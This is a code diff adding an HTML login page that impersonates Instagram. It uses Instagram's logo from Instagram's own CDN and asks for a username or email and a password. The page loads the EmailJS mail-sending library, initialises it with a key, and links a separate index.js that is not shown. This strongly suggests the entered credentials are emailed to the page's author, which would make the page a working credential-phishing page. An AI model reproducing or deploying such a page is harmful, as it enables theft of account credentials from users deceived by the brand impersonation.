@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+    <link rel="stylesheet" href="form2.css" />
+    <link href="" rel="stylesheet">    <!--new-->
+    <!-- <script src="../index.js"></script> -->
+  </head>
+  <body>
+    <main class="form__container">
+      <div class="container" style="text-align: center;">
+        <h1>
+            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" 
+              style="background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATdtiLb2BQ9.png');
+               background-position: 0px 0px; background-size: 176px 181px; width: 175px; height: 51px; background-repeat:
+                no-repeat; display: inline-block;"></i>  <!--by harrylion-->
+        </h1>
+        <div class="form-group">
+            <!-- Your form content goes here -->
+        </div>
+    </div>
+    
+      <!-- <form action="" method="post"> -->
+        <form id="form">
+          <input
+            type="text"
+            name="from_name"
+            id="from_name"
+            placeholder="Phone number, username, or email"
+          />
+          <input
+            type="password"
+            name="password"
+            id="password"
+            placeholder="Password"
+          />
+          <input class="btn" type="submit" id="button" value="Login" />
+        </form>
+      <a href="#" class="forgot-password">Forgot password?</a>
+        <p class="account">Don't have an account? <a href="#" class="sign-up">Sign up</a></p>
+      </main>
+    <!-- <script></script> -->
+  </body>
+  <script
+    type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+  ></script>
+
+  <script type="text/javascript">
+    emailjs.init("8i_ob8ebOQg7XXW9O");
+  </script>
+  <script src="index.js"></script>
+</html>
